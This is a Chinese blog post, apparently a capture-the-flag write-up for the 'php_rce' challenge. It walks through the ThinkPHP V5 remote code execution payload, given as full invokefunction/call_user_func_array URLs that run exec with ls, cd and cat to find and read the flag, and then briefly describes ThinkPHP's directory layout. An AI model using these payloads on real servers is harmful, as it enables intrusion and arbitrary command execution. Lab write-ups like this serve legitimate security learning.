---
layout: post
title: Web进阶题-php_rce
excerpt: "攻防世界进阶Web题目-php_rce"
date:   2020-10-12 19:28:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网站，网页为ThinkPHP V5的页面，所以猜测要利用ThinkPHP V5的远程代码执行漏洞
2. 网上搜索payload，*index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars\[1\][]=1*，成功回显phpinfo()，说明存在漏洞
3. 遍历目录寻找flag，*ip:port//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=ls*，返回网页内容为"static"
4. 进入static，查看文件夹内容，*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd%20static;ls*，返回网页内容为空
5. 发现ls只会返回来一行，所以可以通过head命令，查看特定的某一行
6. 最后*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd /;ls -l\|head \-n 6*，发现了flag文件，网页返回内容为“-rw-r--r-- 1 root root 20 Jul 29 2019 flag”
7. 访问该文件内容，*ip:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars\[1\]\[\]=cd% /;cat flag;*，网页返回内容为"flag{thinkphp5_rce}"
8. 提交flag，答案正确。

## 独立思考

### 1. ThinkPHP是什么？

ThinkPHP是一个快速、兼容而且简单的轻量级PHP开发框架。它使用了面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。

本题中的页面就是ThinkPHP安装完成后的起始页面，所以该页面本身没有注入点，注入点在框架本身。

其目录结构为：

```text
www  WEB部署目录（或者子目录）
├─application           应用目录
│  ├─common             公共模块目录（可以更改）
│  ├─......             ......
│
├─config                应用配置目录
│
├─route                 路由定义目录
│  ├─route.php          路由定义
│  └─...                更多
│
├─public                WEB目录（对外访问目录）
│  ├─index.php          入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于apache的重写
│
├─thinkphp              框架系统目录
│  ├─start.php          框架入口文件
│  └─.....              ......
│
├─extend                扩展类库目录
├─runtime               应用的运行时目录（可写，可定制）
├─vendor                第三方类库目录（Composer依赖库）
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─think                 命令行入口文件
```

## 产生过的疑问

1. ThinkPHP是什么？

